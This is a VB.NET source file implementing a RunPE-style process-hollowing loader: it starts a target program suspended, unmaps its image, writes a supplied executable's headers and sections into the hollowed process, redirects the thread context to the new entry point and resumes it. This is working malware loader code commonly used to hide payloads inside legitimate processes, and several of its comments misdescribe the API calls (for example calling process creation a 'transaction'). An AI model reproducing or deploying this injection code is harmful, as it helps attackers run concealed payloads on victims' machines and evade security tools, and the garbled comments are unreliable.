Imports System.Runtime.InteropServices
Imports System.ComponentModel

Public Class rp
    ' The following constants define memory page access rights
    Public Const PAGE_NOCACHE As Long = &H200 ' Using cache
    Public Const PAGE_EXECUTE_READWRITE As Long = &H40 ' Execution and read/write
    Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80 ' Execute and write copy
    Public Const PAGE_EXECUTE_READ As Long = &H20 ' Execution and reading
    Public Const PAGE_EXECUTE As Long = &H10 ' Execute
    Public Const PAGE_WRITECOPY As Long = &H8 ' Write copy
    Public Const PAGE_NOACCESS As Long = &H1 ' No access
    Public Const PAGE_READWRITE As Long = &H4 ' Read/write
    Public Const PAGE_READONLY As UInt32 = &H2 ' Reading only


    Shared Sub MakeIt(ByVal data() As Byte, ByVal target As String)
        ' Configurations and definitions
        ' Define related structures and variables
        Dim C = New H.Context ' Create process context
        Dim SH As H.Section_Header ' Create section header structure
        Dim PI = New H.Process_Information ' Create process information structure
        Dim SI = New H.Startup_Information ' Create startup information structure
        Dim PS = New H.Security_Flags ' Create security flags structure
        Dim TS = New H.Security_Flags ' Create security flags structure

        Dim GC = GCHandle.Alloc(data, GCHandleType.Pinned) ' Create a fixed pointer to data
        Dim Buffer As Integer = GC.AddrOfPinnedObject.ToInt32 ' Get the memory address of the fixed pointer
        Dim DH As New H.DOS_Header ' Create DOS header structure
        DH = Marshal.PtrToStructure(GC.AddrOfPinnedObject, DH.GetType) ' Convert data to DOS header structure
        GC.Free() ' Free the fixed pointer



        ' Create a new transaction
        ' Create a transaction
        ' H.CreateProcess: Part of the Windows operating system API and is used to start a new process.
        ' Parameters:
        ' - nothing: The start command for the new process is not specified, i.e. the default command will be used.
        ' - target: Specifies the command to start a new process. For example, it can contain the path and name of an application.
        ' - PS: Specifies safety flags, in this case the value PS is used.
        ' - TS: Specifies security flags, in this case the value TS was used.
        ' - False: Specifies not to wait for the creating process when the new process is created.
        ' - 4: Specifies a special chunk size for the created transaction (4 in this case).
        ' - Nothing: A default environment block will be used for the new process.
        ' - Nothing: A default process block will be used for the new process.
        ' - SI: Specifies initialisation information.
        ' - PI: Specifies the variable used to store the process information.

        ' If the transaction was successfully created, the return value will not be 0.
        ' This line of code is used to terminate the transaction (with the Return command) when the transaction cannot be created.
        If H.CreateProcess(Nothing, target, PS, TS, False, 4, Nothing, Nothing, SI, PI) = 0 Then Return


        ''''''''''''''''''''''''''''''''''''''''''''''''''''''




        ' Getting NT header information
        ' Getting NT header information
        ' NH: We create a structure to hold NT header information.

        ' Marshal.PtrToStructure: Creates a structure from the given memory address.
        ' - New IntPtr(Buffer + DH.Address): We create an IntPtr (pointer) representing the address of a location in memory.
        ' - Buffer: Represents the starting address where the data is located in memory.
        ' - DH.Address: Represents an offset (change) value pointing to the NT header inside the DOS header.
        ' - NH.GetType: Specifies the type of structure created.

        ' NH contains NT header information that is now decoded from a specific location in memory.
        ' The content of the NH structure contains the properties of the NT header.

        ' Address: A variable used to store the memory address of the process structure.
        ' Offset: A variable used to store the offset (change) value pointing to the NT header.
        ' ret: A variable used to store the result of the operation.

        ' These lines of code decode the NT header information from the given memory address and place it in the NH structure.
        ' This header information represents the structure and properties of the operation and is used later during the operation.

        Dim NH As New H.NT_Headers
        NH = Marshal.PtrToStructure(New IntPtr(Buffer + DH.Address), NH.GetType)
        Dim Address, Offset As Long, ret As UInteger


        ''''''''''''''''''''''''''''''''''''''''''''








        ' Thread context retrieval and memory operations
        ' Thread context retrieval and memory operations
        SI.CB = Len(SI) ' Set the size of the initialisation information
        C.Flags = 65538 ' Set flags of the process context
        If NH.Signature <> 17744 Or DH.Magic <> 23117 Then Return ' Verify NT header and DOS header

        ' H.GetThreadContext(PI.Thread, C): Get thread context
        ' H.ReadProcessMemory(PI.Process, C.Ebx + 8, Address, 4, 0) >= 0: Read an address from memory
        ' H.ZwUnmapViewOfSection(PI.Process, Address) >= 0: Remove memory region
        If H.GetThreadContext(PI.Thread, C) And H.ReadProcessMemory(PI.Process, C.Ebx + 8, Address, 4, 0) >= 0 And H.ZwUnmapViewOfSection(PI.Process, Address) >= 0 Then
            ' Creating a memory region in a new process and copying data
            Dim ImageBase As UInt32 = H.VirtualAllocEx(PI.Process, NH.Optional.Image, NH.Optional.SImage, 12288, 4) ' Create a new memory region in the process
            If ImageBase <> 0 Then ' Was the memory region created successfully?
                H.WriteProcessMemory(PI.Process, ImageBase, data, NH.Optional.SHeaders, ret) ' Copy data to new memory region
                Offset = DH.Address + 248 ' Calculate the initial offset of the data in memory
                For I As Integer = 0 To NH.File.Sections - 1 ' Loop all sections
                    SH = Marshal.PtrToStructure(New IntPtr(Buffer + Offset + I * 40), SH.GetType) ' Retrieve section header from memory
                    Dim Raw(SH.Size) As Byte ' Create an array to store the data
                    For Y As Integer = 0 To SH.Size - 1 : Raw(Y) = data(SH.Pointer + Y) : Next ' Copy data
                    H.WriteProcessMemory(PI.Process, ImageBase + SH.Address, Raw, SH.Size, ret) ' Copy data to new memory region
                    H.VirtualProtectEx(PI.Process, ImageBase + SH.Address, SH.Misc.Size, Protect(SH.Flags), Address) ' Set memory region protection flags
                Next I
                Dim T = BitConverter.GetBytes(ImageBase) ' Convert ImageBase address to bytes
                H.WriteProcessMemory(PI.Process, C.Ebx + 8, T, 4, ret) ' Update an address in the process
                C.Eax = ImageBase + NH.Optional.Address ' Update the Eax value of the process context
                H.SetThreadContext(PI.Thread, C) ' Update thread context
                H.ResumeThread(PI.Thread) ' Restart the thread
            End If
        End If
    End Sub

    ' This function is used to right shift a long integer value by a specified number of bits.
    Private Shared Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
        RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
    End Function

    ' This function converts a long integer (Long) to an unsigned long integer (UInteger).
    ' The conversion to unsigned long integer allows negative values to be handled.
    Private Shared Function vbLongToULong(ByVal Value As Long) As Double
        Const OFFSET_4 = 4294967296.0#
        If Value < 0 Then
            vbLongToULong = Value + OFFSET_4
        Else
            vbLongToULong = Value
        End If
    End Function

    ' This function converts a given set of characteristics to a protection level.
    ' Characteristics are expressed as numeric values and this function converts this number to a protection type.
    Private Shared Function Protect(ByVal characteristics As Long) As Long
        Dim mapping() As Object = {PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY,
    PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE,
    PAGE_READWRITE, PAGE_EXECUTE_READWRITE}
        Protect = mapping(RShift(characteristics, 29))
    End Function

    ' The Context structure inside the H class represents the processor state and other resources.
    ' This structure is used in some operations in the Windows operating system.
    <EditorBrowsable(1)> Friend Class H
        <StructLayout(0)> Structure Context
            ' The Context structure contains processor state and resources.
            ' The use of this structure is customisable and operating system dependent.
            Dim Flags, D0, D1, D2, D3, D6, D7 As UInt32, Save As Save
            Dim SG, SF, SE, SD, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SC, EFlags, Esp, SS As UInt32
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> Dim Registers As Byte()
        End Structure

        ' The Save structure contains data about the processor status.
        Structure Save
            Dim Control, Status, Tag, ErrorO, ErrorS, DataO, DataS As UInteger
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> Dim RegisterArea As Byte()
            Dim State As UInt32
        End Structure

        ' The Misc structure represents the address and size of a specific area within the processor state.
        Structure Misc
            Dim Address, Size As UInt32
        End Structure

        ' The Section_Header structure represents the information of a section within a file.
        Structure Section_Header
            Dim Name As Byte, Misc As Misc, Address, Size, Pointer, PRelocations, PLines, NRelocations, NLines, Flags As UInt32
        End Structure

        ' The Process_Information structure contains information about a process and a thread.
        Structure Process_Information
            Dim Process, Thread As IntPtr, ProcessId, ThreadId As Integer
        End Structure

        ' The Startup_Information structure contains the initialisation information used when starting a process.
        <StructLayout(0, CharSet:=3)> Structure Startup_Information
            Dim CB As Integer, ReservedA, Desktop, Title As String, X, Y, XSize, YSize, XCount, YCount, Fill, Flags As Integer
            Dim ShowWindow, ReservedB As Short, ReservedC, Input, Output, [Error] As Integer
        End Structure

        ' The Security_Flags structure contains security identifiers.
        <StructLayout(0)> Structure Security_Flags
            Dim Length As Integer, Descriptor As IntPtr, Inherit As Integer
        End Structure

        ' DOS_Header structure contains header information of DOS applications.
        <StructLayout(0)> Structure DOS_Header
            Dim Magic, Last, Pages, Relocations, Size, Minimum, Maximum, SS, SP, Checksum, IP, CS, Table, Overlay As UInt16
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> Dim ReservedA As UInt16()
            Dim ID, Info As UInt16
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> Dim ReservedB As UInt16()
            Dim Address As Int32
        End Structure

        ' The NT_Headers structure contains NT (New Technology) file header information.
        Structure NT_Headers
            Dim Signature As UInt32, File As File_Header, [Optional] As Optional_Headers
        End Structure

        ' The File_Header structure contains the header information of a file.
        <StructLayout(0)> Structure File_Header
            Dim Machine, Sections As UInt16, Stamp, Table, Symbols As UInt32, Size, Flags As UInt16
        End Structure

        ' The Optional_Headers structure contains optional header information.
        <StructLayout(0)> Structure Optional_Headers
            Public Magic As UInt16, Major, Minor As Byte, SCode, IData, UData, Address, Code, Data, Image As UInt32, SectionA, FileA As UInt32
            Public MajorO, MinorO, MajorI, MinorI, MajorS, MinorS As UInt16, Version, SImage, SHeaders, Checksum As UInt32, Subsystem, Flags As UInt16
            Public SSReserve, SSCommit, SHReserve, SHCommit, LFlags, Count As UInt32
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> Public DataDirectory As Data_Directory()
        End Structure

        ' Data_Directory structure contains data directories.
        <StructLayout(0)> Structure Data_Directory
            Dim Address, Size As UInt32
        End Structure

        ' The CreateProcess function is used to create a new process.
        Declare Auto Function CreateProcess Lib "kernel32" (ByVal name As String, ByVal command As String, ByRef process As Security_Flags, ByRef thread As Security_Flags, ByVal inherit As Boolean, ByVal flags As UInt32, ByVal system As IntPtr, ByVal current As String, <[In]()> ByRef startup As Startup_Information, <Out()> ByRef info As Process_Information) As Boolean

        ' WriteProcessMemory function is used to write data to another process memory.
        Declare Auto Function WriteProcessMemory Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal buffer As Byte(), ByVal size As IntPtr, <Out()> ByRef written As Integer) As Boolean

        ' ReadProcessMemory function is used to read data from another process memory.
        Declare Auto Function ReadProcessMemory Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByRef buffer As IntPtr, ByVal size As IntPtr, ByRef read As Integer) As Integer

        ' The VirtualProtectEx function is used to change the protection level of a section within a process memory.
        Declare Auto Function VirtualProtectEx Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal size As UIntPtr, ByVal [new] As UIntPtr, <Out()> ByVal old As UInt32) As Integer

        ' The VirtualAllocEx function is used to create a new partition in a process memory.
        Declare Auto Function VirtualAllocEx Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal size As UInt32, ByVal type As UInt32, ByVal protect As UInt32) As IntPtr

        ' The function ZwUnmapViewOfSection is used to remove a section in a process memory.
        Declare Auto Function ZwUnmapViewOfSection Lib "ntdll" (ByVal process As IntPtr, ByVal address As IntPtr) As Long

        ' ResumeThread function is used to resume a thread.
        Declare Auto Function ResumeThread Lib "kernel32" (ByVal thread As IntPtr) As UInt32

        ' GetThreadContext function is used to get the context of a thread.
        Declare Auto Function GetThreadContext Lib "kernel32" (ByVal thread As IntPtr, ByRef context As Context) As Boolean

        ' SetThreadContext function is used to set the context of a thread.
        Declare Auto Function SetThreadContext Lib "kernel32" (ByVal thread As IntPtr, ByRef context As Context) As Boolean
    End Class
End Class
